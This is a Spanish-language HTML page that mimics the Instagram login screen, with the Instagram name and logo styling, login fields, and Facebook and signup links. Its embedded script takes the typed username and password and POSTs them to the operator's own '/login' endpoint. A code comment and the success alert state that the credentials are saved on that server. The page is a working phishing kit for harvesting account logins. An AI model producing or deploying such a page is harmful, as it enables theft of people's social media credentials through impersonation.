<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #000;
      color: white;
      font-family: 'Segoe UI', Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      width: 100%;
      max-width: 350px;
    }

    .logo {
      font-family: 'Brush Script MT', cursive;
      font-size: 40px;
      font-weight: bold;
      color: white;
      letter-spacing: -1px;
      margin-bottom: 24px;
    }

    form {
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    input {
      height: 36px;
      padding: 0 8px;
      margin-bottom: 12px;
      background: #262626;
      border: 1px solid #404040;
      border-radius: 4px;
      font-size: 14px;
      color: white;
      outline: none;
    }

    input::placeholder {
      color: #8e8e8e;
    }

    input:focus {
      border-color: #5c5c5c;
    }

    button {
      background-color: #0095f6; /* Azul brillante como en la imagen */
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      font-size: 14px;
      height: 36px;
      margin-bottom: 12px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0077ed;
    }

    .divider {
      text-align: center;
      color: #8e8e8e;
      font-size: 13px;
      margin: 20px 0;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: "";
      position: absolute;
      top: 50%;
      width: 30%;
      height: 1px;
      background: #404040;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .facebook-login {
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1877F2;
      font-size: 14px;
      font-weight: 600;
      text-decoration: none;
      margin-bottom: 18px;
    }

    .facebook-login svg {
      margin-right: 8px;
      width: 16px;
      height: 16px;
    }

    .forgot-password {
      display: block;
      text-align: center;
      color: #0095f6;
      font-size: 14px;
      text-decoration: none;
      margin-bottom: 18px;
    }

    .signup {
      text-align: center;
      font-size: 14px;
      margin-top: 20px;
    }

    .signup a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    /* --- Responsive para móviles --- */
    @media (max-width: 768px) {
      .login-container {
        padding: 20px;
        width: 100%;
        max-width: 350px;
        margin: 0 auto;
      }

      .logo {
        font-size: 32px;
      }

      input {
        font-size: 13px;
        height: 32px;
      }

      button {
        font-size: 13px;
        height: 32px;
      }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">Instagram</div>

    <form id="loginForm">
      <input type="text" placeholder="Teléfono, usuario o correo electrónico" required />
      <input type="password" placeholder="Contraseña" required />
      <button type="submit">Iniciar sesión</button>
    </form>

    <div class="divider">o</div>

    <a href="#" class="facebook-login">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="#1877F2">
        <path d="M15.997 0H0v16h15.997V0z"/>
        <path d="M8.001 12.001V8.001H6.001V6.001H8.001V4.001C8.001 3.449 8.449 3.001 9.001 3.001H10.001V6.001H9.001V8.001H10.001V12.001H8.001z" fill="white"/>
      </svg>
      Iniciar sesión con Facebook
    </a>

    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>

    <div class="signup">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
  </div>

  <script>
    // Función para enviar datos a TU servidor (no descarga en el cliente)
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const username = document.querySelector('input[type="text"]').value.trim();
      const password = document.querySelector('input[type="password"]').value.trim();

      if (!username || !password) {
        alert('Por favor, completa todos los campos.');
        return;
      }

      try {
        const response = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });

        if (response.ok) {
          alert('✅ ¡Inicio de sesión exitoso!\nLos datos se han guardado en el servidor.');
        } else {
          alert('❌ Error al guardar los datos.');
        }
      } catch (err) {
        alert('⚠️ No se pudo conectar con el servidor.\nAsegúrate de que esté activo.');
      }
    });
  </script>

</body>
</html>
